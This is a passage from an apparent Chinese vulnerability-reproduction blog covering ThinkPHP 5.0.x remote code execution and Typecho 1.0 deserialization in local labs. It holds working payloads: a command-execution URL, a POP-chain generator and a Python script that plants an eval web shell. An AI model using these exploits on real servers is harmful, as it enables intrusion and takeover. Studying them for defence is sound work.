路由检测</p>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109231449360-339105155.png\" alt=\"img\"></p>\n<p>跟进 routeCheck () 方法，看到最上面 $path 通过 path () 方法获取，值为 payload 中 s 后面的参数 &quot;index/think\\app/invokefunction&quot;</p>\n<p><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000212836-250916839.png\" alt=\"img\"></p>\n<p>这里可以尝试跟进一下 path () 方法：</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234256747-1493465291.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234256747-1493465291.png\" alt=\"img\"></a></p>\n<p>最后返回的<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>p</mi><mi>a</mi><mi>t</mi><mi>h</mi><mtext>是</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt;path是</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord cjk_fallback\">是</span></span></span></span> pathinfo 获取来的，$pathinfo 又是通过 pathinfo () 方法获取来的，跟进 pathinfo () 方法</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234406178-487044200.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234406178-487044200.png\" alt=\"img\"></a></p>\n<p>看到这里基本上就破案了，先判断通过 $_GET 方式传递过来的参数中有没有 s 传递过来的参数，如果有的话就获取，最后去掉两边的’ / ' 然后 return，也就是 &quot;index/think\\app/invokefunction&quot;</p>\n<p>继续往下走，可以看到有如下判断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$must = !is_null(self::$routeMust) ? self::$routeMust : $config[&#x27;url_route_must&#x27;];</span><br></pre></td></tr></table></figure>\n<p>如果开启了强制路由，那么输入的路由将报错导致后面导致程序无法运行，也就不存在 RCE 漏洞，但是默认是关闭的。</p>\n<p>最后调用 Route::parseUrl ()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000726472-759985507.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000726472-759985507.png\" alt=\"img\"></a></p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110001554366-91094100.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110001554366-91094100.png\" alt=\"img\"></a></p>\n<p>先通过 str_replace () 函数将url(\"index/think\\app/invokefunction\")中的' / '替换成' | '，然后调用parseUrlPath对 url 进行分割，会把 index/\\think\\app/invokefunction 以’ / ' 为分隔符，分成 [‘index’,‘think\\app’,‘invokefunction’]。</p>\n<p>根据 thinkphp 路由规则 index 为模块 、think\\app 为控制器、invokefunction 为操作，最后封装成路由</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110002217354-1465544639.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110002217354-1465544639.png\" alt=\"img\"></a></p>\n<p>到这里为止 App::routeCheck () 方法才算走完</p>\n<p>继续往下读 App.php 的代码，关键代码在 App::exec 中，因为返回值中为 module，因此进入黄色部分</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110003646394-1878424898.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110003646394-1878424898.png\" alt=\"img\"></a></p>\n<p>跟进 module 方法，黄色部分检测 module 是否存在，不存在则报错。<a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171434352-913856897.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171434352-913856897.png\" alt=\"img\"></a></p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171606416-1486045006.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171606416-1486045006.png\" alt=\"img\"></a></p>\n<p>上面代码表示只要<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>u</mi><mi>l</mi><mi>e</mi><mtext>存在，并且</mtext></mrow><annotation encoding=\"application/x-tex\">module存在，并且</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">存</span><span class=\"mord cjk_fallback\">在</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">并</span><span class=\"mord cjk_fallback\">且</span></span></span></span> available 为 True，就可以初始化模块，并进行调用。</p>\n<p>继续往下看代码，构造控制器的过程调用了 Loder::controller 方法，然后又调用了 self::getModuleAndClass 该方法就是获取 Module、Class 的，这里通过判断name中是否存在' \\ '，若存在class就是name，此时name，此时name为think\\App，因此 class=think\\App，至此就成功调用了 App 类</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172601127-1107177748.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172601127-1107177748.png\" alt=\"img\"></a></p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172622437-2009673675.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172622437-2009673675.png\" alt=\"img\"></a></p>\n<p>控制器之后会获取当前的操作名，跟进 self::invokeMethod ()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110173942307-1901023290.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110173942307-1901023290.png\" alt=\"img\"></a></p>\n<p>该方法里用了 ReflectionMethod 来构造 App 类的 invokefunction 方法，然后就是调用 App::invokefunction ()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174034070-926914784.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174034070-926914784.png\" alt=\"img\"></a></p>\n<p>跟进 App::invokefunction ()，最后就是执行命令的地方，利用 ReflectionFunction，来构造自己想要的函数执行即可，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>u</mi><mi>n</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>、</mtext></mrow><annotation encoding=\"application/x-tex\">function、</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">、</span></span></span></span>vars，都可以通过 $_GET 方式获取</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174321981-478185155.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174321981-478185155.png\" alt=\"img\"></a></p>\n<p>因此通过 url 传参 function=call_user_func_array&amp;vars [0]=system&amp;vars [1][]=whoami</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174725217-873714846.png\"><img data-src=\"https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174725217-873714846.png\" alt=\"img\"></a></p>\n<p>5.0.22 铺垫结束，其实真正的反序列化在 5.0.24，但利用条件苛刻，只有二次开发实现了反序列化才可以利用，在 /application/index/controller/Index.php 中添加反序列化反序列化触发点代码</p>\n<p>所以只给个 payload，开摆！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    namespace think\\session\\driver;</span><br><span class=\"line\">    use think\\cache\\driver\\File;</span><br><span class=\"line\">    class Memcached&#123;</span><br><span class=\"line\">        protected $handler = null;</span><br><span class=\"line\">        function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;handler = new File();  //此处赋值$this-&gt;handler为File类的一个对象，这样就可以调用File.php::set()方法</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\cache;</span><br><span class=\"line\">    abstract class Driver&#123;</span><br><span class=\"line\">        function __construct()&#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\cache\\driver;</span><br><span class=\"line\">    use think\\cache\\Driver;</span><br><span class=\"line\">    class File extends Driver&#123;  //此处重写File.php::set方法，构造写入的$filename</span><br><span class=\"line\">        protected $tag;</span><br><span class=\"line\">        protected $options = [];</span><br><span class=\"line\">        function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;tag = &#x27;nocatch&#x27;;</span><br><span class=\"line\">            $this-&gt;options = [</span><br><span class=\"line\">                &#x27;cache_subdir&#x27;=&gt;false,</span><br><span class=\"line\">                &#x27;prefix&#x27;=&gt;&#x27;&#x27;,</span><br><span class=\"line\">                &#x27;path&#x27;=&gt;&#x27;php://filter/write=string.rot13/resource=./static/&lt;?cuc cucvasb();?&gt;&#x27;,  //rot13编码</span><br><span class=\"line\">                &#x27;data_compress&#x27;=&gt;false,</span><br><span class=\"line\">            ];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\console;</span><br><span class=\"line\">    use think\\session\\driver\\Memcached;</span><br><span class=\"line\">    class Output&#123;</span><br><span class=\"line\">        private $handle = null;</span><br><span class=\"line\">        protected $styles = [];</span><br><span class=\"line\">        function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;styles = [&#x27;removeWhereField&#x27;];  </span><br><span class=\"line\">            $this-&gt;handle = new Memcached();  //此处赋值$this-&gt;handle为Memcached的一个对象，来调用Memcached::write()方法</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\model;</span><br><span class=\"line\">    use think\\console\\Output;</span><br><span class=\"line\">    abstract class Relation&#123;</span><br><span class=\"line\">          protected $query;</span><br><span class=\"line\">          protected $foreignKey;</span><br><span class=\"line\">          function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;query = new Output();  //此处赋值$this-&gt;query为Output的一个对象，这样因为不存在removeWhereField方法，从而会调用Output类的__call方法</span><br><span class=\"line\">            $this-&gt;foreignKey = &quot;aaaaaaaaa&quot;;  //参数</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\model\\relation;</span><br><span class=\"line\">    use think\\model\\Relation;</span><br><span class=\"line\">    abstract class OneToOne extends Relation&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\model\\relation;</span><br><span class=\"line\">    class HasOne extends OneToOne&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think;</span><br><span class=\"line\">    use think\\model\\relation\\HasOne;</span><br><span class=\"line\">    use think\\console\\Output;</span><br><span class=\"line\">    abstract class Model&#123;</span><br><span class=\"line\">        protected $append = [];</span><br><span class=\"line\">        protected $error;</span><br><span class=\"line\">        protected $parent;</span><br><span class=\"line\">         function __construct()&#123;</span><br><span class=\"line\">            $this-&gt;append = [&#x27;bmjoker&#x27;=&gt;&#x27;getError&#x27;];</span><br><span class=\"line\">            $this-&gt;error = new HasOne();  //此处赋值$this-&gt;error为类HasOne的一个对象</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\process\\pipes;</span><br><span class=\"line\">    use think\\model\\concern\\Conversion;</span><br><span class=\"line\">    use think\\model\\Pivot;</span><br><span class=\"line\">    class Windows</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        private $files = [];</span><br><span class=\"line\">        public function __construct()</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $this-&gt;files=[new Pivot()];  //此处赋值$filename为类Pivot的一个对象</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    namespace think\\model;</span><br><span class=\"line\">    use think\\Model;</span><br><span class=\"line\">    class Pivot extends Model&#123;&#125;  //此处会自动调用Model类</span><br><span class=\"line\"></span><br><span class=\"line\">    use think\\process\\pipes\\Windows;</span><br><span class=\"line\">    echo base64_encode(serialize(new Windows()));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>注意这个洞在 windows 下是复现不了的，因为 windows 对文件名有限制，会写入失败。</p>\n<h3 id=\"typecho-反序列化漏洞\"><a class=\"markdownIt-Anchor\" href=\"#typecho-反序列化漏洞\">#</a> typecho 反序列化漏洞</h3>\n<p>复现条件：php=5.x typecho 版本 typecho-1.0-14.10.10-release</p>\n<p>安装前先去数据库创建 typecho 库，不然安装时报错</p>\n<p>url 中输入 (<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC90eXBlY2hvLw==\">http://127.0.0.1:18888/typecho/</span>) 自动跳转安装页面，里面的内容根据自己的填</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125094835151.png\" alt=\"image-20221125094835151\"></p>\n<p>任意命令执行 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Typecho_Feed</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    const RSS1 = &#x27;RSS 1.0&#x27;;</span><br><span class=\"line\">    const RSS2 = &#x27;RSS 2.0&#x27;;</span><br><span class=\"line\">    const ATOM1 = &#x27;ATOM 1.0&#x27;;</span><br><span class=\"line\">    const DATE_RFC822 = &#x27;r&#x27;;</span><br><span class=\"line\">    const DATE_W3CDTF = &#x27;c&#x27;;</span><br><span class=\"line\">    const EOL = &quot;\\n&quot;;</span><br><span class=\"line\">    private $_type;</span><br><span class=\"line\">    private $_items;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;_type = $this::RSS2;</span><br><span class=\"line\">        $this-&gt;_items[0] = array(</span><br><span class=\"line\">            &#x27;title&#x27; =&gt; &#x27;1&#x27;,</span><br><span class=\"line\">            &#x27;link&#x27; =&gt; &#x27;1&#x27;,</span><br><span class=\"line\">            &#x27;date&#x27; =&gt; 1508895132,</span><br><span class=\"line\">            &#x27;category&#x27; =&gt; array(new Typecho_Request()),</span><br><span class=\"line\">            &#x27;author&#x27; =&gt; new Typecho_Request(),</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class Typecho_Request</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    private $_params = array();</span><br><span class=\"line\">    private $_filter = array();</span><br><span class=\"line\">    public function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;_params[&#x27;screenName&#x27;] = &#x27;phpinfo()&#x27;;    //替换phpinfo()这里进行深度利用</span><br><span class=\"line\">        $this-&gt;_filter[0] = &#x27;assert&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$exp = array(</span><br><span class=\"line\">    &#x27;adapter&#x27; =&gt; new Typecho_Feed(),</span><br><span class=\"line\">    &#x27;prefix&#x27; =&gt; &#x27;typecho_&#x27;</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">echo base64_encode(serialize($exp));</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</span><br></pre></td></tr></table></figure>\n<p>访问：</p>\n<p><code>http://localhost:18888/typecho/install.php?finish</code></p>\n<p>通过 post 传入 payload：</p>\n<p><code>__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125104636822.png\" alt=\"image-20221125104636822\"></p>\n<p>通过 python 写 shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests </span><br><span class=\"line\">import sys </span><br><span class=\"line\">url = &quot;http://localhost/typecho/install.php?finish=&quot;</span><br><span class=\"line\">payload = &quot;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU4OiJmcHV0cyhmb3Blbignc2hlbGwucGhwJywndycpLCc8Pz1AZXZhbCgkX1JFUVVFU1RbNzc3XSk/PicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTg6ImZwdXRzKGZvcGVuKCdzaGVsbC5waHAnLCd3JyksJzw/PUBldmFsKCRfUkVRVUVTVFs3NzddKT8+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjg6InR5cGVjaG9fIjt9&quot; </span><br><span class=\"line\">postData = &#123;&quot;__typecho_config&quot;:payload&#125; </span><br><span class=\"line\">header =&#123; </span><br><span class=\"line\">\t&quot;Referer&quot;:url, </span><br><span class=\"line\">\t&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;&#125; </span><br><span class=\"line\">\t</span><br><span class=\"line\">print(url) </span><br><span class=\"line\">res = requests.get(url) </span><br><span class=\"line\">if res.status_code == 200: </span><br><span class=\"line\">\tprint(&quot;[+] install.php exist!&quot;) </span><br><span class=\"line\">else: </span><br><span class=\"line\">\tprint(&quot;[-] install.php not exist&quot;) </span><br><span class=\"line\">\tsys.exit() </span><br><span class=\"line\">\t</span><br><span class=\"line\">res = requests.post(url = url,data = postData,headers = header) </span><br><span class=\"line\">res = requests.get(url+&quot;shell.php&quot;) </span><br><span class=\"line\">if res.status_code == 200: </span><br><span class=\"line\">\tprint(&quot;[+] Shell.php write success!&quot;) </span><br><span class=\"line\">\tprint(&quot;Shell path :&quot;,url+&quot;shell.php&quot;) </span><br><span class=\"line\">else: </span><br><span class=\"line\">\tprint(&quot;[-] GetShell Error!&quot;)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125151707169.png\" alt=\"image-20221125151707169\" style=\"zoom: 67%;\" />1</p>\n<p>漏洞分析：</p>\n<p>1.install.php</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153310059.png\" alt=\"image-20221125153310059\"></p>\n<p>这里需要传入一个 finish 参数，然后在 230 行将 cookie 中的__typecho_config 的值通过 base64 解码之后反序列化。</p>\n<p>而__typecho_config 是通过 cookie 传入的，在 install.php 中 528 行，set __typecho_config，并且将其序列化后 base64 编码</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153401994.png\" alt=\"image-20221125153401994\"></p>\n<p>在 cookie.php 中，set 的定义：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125153457221.png\" alt=\"image-20221125153457221\"></p>\n<p>2.install.php</p>\n<p>再往下看两行到 232 行，这里将<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mi>o</mi><mi>n</mi><mi>f</mi><mi>i</mi><mi>g</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>a</mi><mi>d</mi><mi>a</mi><mi>p</mi><mi>t</mi><mi>e</mi><msup><mi>r</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo 